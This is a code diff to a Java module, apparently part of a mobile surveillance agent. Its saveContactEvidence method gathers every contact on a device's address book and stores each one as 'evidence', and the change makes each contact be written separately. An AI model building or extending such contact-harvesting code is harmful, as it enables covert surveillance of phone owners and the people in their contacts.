@@ -197,13 +197,13 @@ public final class ModuleAddressBook extends BaseModule implements
     private int saveContactEvidence(ContactList contactList)
             throws PIMException {
         final Enumeration eContacts = contactList.items();
-
+        
         //#ifdef DEBUG
         debug.trace("saveContactEvidence: got contacts"); //$NON-NLS-1$
         //#endif
 
-        Evidence evidence = new Evidence(EvidenceType.ADDRESSBOOK);
-        evidence.createEvidence();
+       // Evidence evidence = new Evidence(EvidenceType.ADDRESSBOOK);
+        //evidence.createEvidence();
 
         Contact contact;
         int number = 0;
@@ -214,7 +214,8 @@ public final class ModuleAddressBook extends BaseModule implements
             try {
                 contact = (Contact) eContacts.nextElement();
                 final byte[] packet = getContactPacket(contactList, contact);
-                evidence.writeEvidence(packet);
+                Evidence evidence = new Evidence(EvidenceType.ADDRESSBOOK);
+                evidence.atomicWriteOnce(packet);
             } catch (final Exception ex) {
                 //#ifdef DEBUG
                 debug.error(ex);
@@ -225,7 +226,7 @@ public final class ModuleAddressBook extends BaseModule implements
         //#ifdef DEBUG
         debug.trace("saveContactEvidence: finished contacts. Total: " + number); //$NON-NLS-1$
         //#endif
-        evidence.close();
+        //evidence.close();
 
         return number;
     }
